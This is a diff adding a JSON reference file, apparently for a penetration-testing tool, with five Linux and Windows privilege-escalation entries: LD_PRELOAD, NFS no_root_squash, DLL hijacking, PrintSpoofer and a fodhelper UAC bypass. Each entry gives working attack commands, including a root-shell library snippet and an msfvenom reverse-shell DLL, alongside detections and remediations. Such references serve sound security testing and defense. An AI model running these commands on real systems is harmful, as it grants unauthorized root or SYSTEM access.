@@ -1,0 +1,256 @@
+[
+  {
+    "id": "linux-ld-preload",
+    "tool": "manual",
+    "category": "privilege_escalation",
+    "phase": 6,
+    "os": [
+      "linux"
+    ],
+    "command": "# If sudo allows env_keep+=LD_PRELOAD:\ngcc -shared -fPIC -o /tmp/pe.so pe.c && sudo LD_PRELOAD=/tmp/pe.so <allowed_command>",
+    "name": "LD_PRELOAD Privilege Escalation",
+    "description": "If sudo preserves LD_PRELOAD, inject a shared library that spawns root shell.",
+    "arguments": {
+      "LD_PRELOAD": "Preload shared library before execution"
+    },
+    "expected_output": "# pe.c:\nvoid _init() { setuid(0); system(\"/bin/bash\"); }\n# Result: root shell",
+    "use_case": "Exploit sudo env_keep with LD_PRELOAD to escalate to root.",
+    "prerequisites": [
+      "sudo -l shows env_keep+=LD_PRELOAD",
+      "Allowed sudo command"
+    ],
+    "mitre_mapping": [
+      "T1574.006"
+    ],
+    "mitre_tactic": "Privilege Escalation",
+    "detections": [
+      "Unusual LD_PRELOAD usage",
+      "Shared library loading"
+    ],
+    "remediation": [
+      "Remove LD_PRELOAD from env_keep",
+      "Use env_reset in sudoers"
+    ],
+    "common_mistakes": [
+      "env_keep doesn't include LD_PRELOAD"
+    ],
+    "alternatives": [
+      "linpeas (checks automatically)"
+    ],
+    "references": [
+      "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation"
+    ],
+    "tags": [
+      "ld-preload",
+      "sudo",
+      "shared-library",
+      "environment"
+    ]
+  },
+  {
+    "id": "linux-nfs-no-root-squash",
+    "tool": "showmount",
+    "category": "privilege_escalation",
+    "phase": 6,
+    "os": [
+      "linux"
+    ],
+    "command": "# If NFS export has no_root_squash:\nmount -t nfs <target>:/share /mnt\ncp /bin/bash /mnt/bash && chmod +s /mnt/bash\n# On target: /share/bash -p",
+    "name": "NFS no_root_squash Exploit",
+    "description": "If NFS share has no_root_squash, create SUID binary on share for root access.",
+    "arguments": {
+      "no_root_squash": "Root on client = root on server",
+      "chmod +s": "Set SUID bit"
+    },
+    "expected_output": "# On target:\n$ /share/bash -p\nbash-5.1# whoami\nroot",
+    "use_case": "Exploit NFS misconfiguration \u2014 root on your machine = root on the NFS share.",
+    "prerequisites": [
+      "NFS share with no_root_squash",
+      "Can mount the share"
+    ],
+    "mitre_mapping": [
+      "T1548"
+    ],
+    "mitre_tactic": "Privilege Escalation",
+    "detections": [
+      "SUID binary creation on NFS",
+      "Mount from unusual client"
+    ],
+    "remediation": [
+      "Use root_squash (default)",
+      "Restrict NFS client IPs"
+    ],
+    "common_mistakes": [
+      "Share uses root_squash (default)"
+    ],
+    "alternatives": [
+      "linpeas",
+      "showmount -e"
+    ],
+    "references": [
+      "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration"
+    ],
+    "tags": [
+      "nfs",
+      "no-root-squash",
+      "suid",
+      "mount",
+      "privesc"
+    ]
+  },
+  {
+    "id": "windows-dll-hijack",
+    "tool": "manual",
+    "category": "privilege_escalation",
+    "phase": 6,
+    "os": [
+      "windows"
+    ],
+    "command": "# Find DLL search order vulnerability:\n# 1. procmon.exe \u2192 filter: Result=NAME NOT FOUND, Path ends with .dll\n# 2. Place malicious DLL in writable search path\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f dll -o hijack.dll",
+    "name": "DLL Hijacking",
+    "description": "Exploits Windows DLL search order \u2014 place malicious DLL where application looks first.",
+    "arguments": {
+      "procmon": "Find missing DLLs",
+      "msfvenom -f dll": "Generate malicious DLL"
+    },
+    "expected_output": "# Application loads our DLL \u2192 reverse shell as application's user",
+    "use_case": "Escalate privileges by hijacking DLL loading in privileged applications.",
+    "prerequisites": [
+      "Writable directory in DLL search path",
+      "Application loading missing DLL"
+    ],
+    "mitre_mapping": [
+      "T1574.001"
+    ],
+    "mitre_tactic": "Privilege Escalation",
+    "detections": [
+      "New DLL in application directory",
+      "DLL loading from unusual path"
+    ],
+    "remediation": [
+      "Use full DLL paths",
+      "Restrict directory permissions",
+      "Enable SafeDllSearchMode"
+    ],
+    "common_mistakes": [
+      "DLL not in writable path",
+      "Wrong architecture"
+    ],
+    "alternatives": [
+      "PowerUp Find-PathDLLHijack",
+      "winPEAS"
+    ],
+    "references": [
+      "https://book.hacktricks.wiki/en/windows-hardening/privilege-escalation/dll-hijacking"
+    ],
+    "tags": [
+      "dll",
+      "hijack",
+      "search-order",
+      "windows",
+      "privesc"
+    ]
+  },
+  {
+    "id": "windows-printspoofer",
+    "tool": "printspoofer",
+    "category": "privilege_escalation",
+    "phase": 6,
+    "os": [
+      "windows"
+    ],
+    "command": "PrintSpoofer.exe -i -c cmd",
+    "name": "PrintSpoofer (SeImpersonate)",
+    "description": "Exploits SeImpersonatePrivilege via Print Spooler to get SYSTEM \u2014 works on modern Windows.",
+    "arguments": {
+      "-i": "Interactive",
+      "-c cmd": "Command to run as SYSTEM"
+    },
+    "expected_output": "C:\\>whoami\nnt authority\\system",
+    "use_case": "Modern potato exploit \u2014 works on Windows 10/Server 2019 where JuicyPotato fails.",
+    "prerequisites": [
+      "SeImpersonatePrivilege (service accounts)"
+    ],
+    "mitre_mapping": [
+      "T1134"
+    ],
+    "mitre_tactic": "Privilege Escalation",
+    "detections": [
+      "Print Spooler pipe creation",
+      "Token impersonation events"
+    ],
+    "remediation": [
+      "Remove SeImpersonatePrivilege",
+      "Disable Print Spooler"
+    ],
+    "common_mistakes": [
+      "SeImpersonate not available"
+    ],
+    "alternatives": [
+      "GodPotato",
+      "SweetPotato",
+      "JuicyPotato"
+    ],
+    "references": [
+      "https://github.com/itm4n/PrintSpoofer"
+    ],
+    "tags": [
+      "printspoofer",
+      "seimpersonate",
+      "system",
+      "modern",
+      "potato"
+    ]
+  },
+  {
+    "id": "windows-uac-bypass",
+    "tool": "manual",
+    "category": "privilege_escalation",
+    "phase": 6,
+    "os": [
+      "windows"
+    ],
+    "command": "# Using fodhelper.exe:\nreg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d \"cmd.exe\" /f\nreg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /f\nfodhelper.exe",
+    "name": "UAC Bypass (fodhelper)",
+    "description": "Bypasses User Account Control to run commands as high-integrity without UAC prompt.",
+    "arguments": {
+      "reg add": "Set registry keys",
+      "fodhelper.exe": "Auto-elevating binary"
+    },
+    "expected_output": "# High-integrity cmd.exe opens without UAC prompt",
+    "use_case": "Bypass UAC when you have admin credentials but UAC blocks elevation.",
+    "prerequisites": [
+      "Local admin account",
+      "UAC set to default (not Always Notify)"
+    ],
+    "mitre_mapping": [
+      "T1548.002"
+    ],
+    "mitre_tactic": "Privilege Escalation",
+    "detections": [
+      "Registry modification in ms-settings",
+      "fodhelper spawning child process"
+    ],
+    "remediation": [
+      "Set UAC to Always Notify",
+      "Monitor auto-elevating binaries"
+    ],
+    "common_mistakes": [
+      "UAC set to Always Notify"
+    ],
+    "alternatives": [
+      "UACME (many bypass methods)",
+      "eventvwr.exe bypass"
+    ],
+    "references": [
+      "https://book.hacktricks.wiki/en/windows-hardening/privilege-escalation/uac-bypass"
+    ],
+    "tags": [
+      "uac",
+      "bypass",
+      "fodhelper",
+      "elevation",
+      "windows"
+    ]
+  }
+]
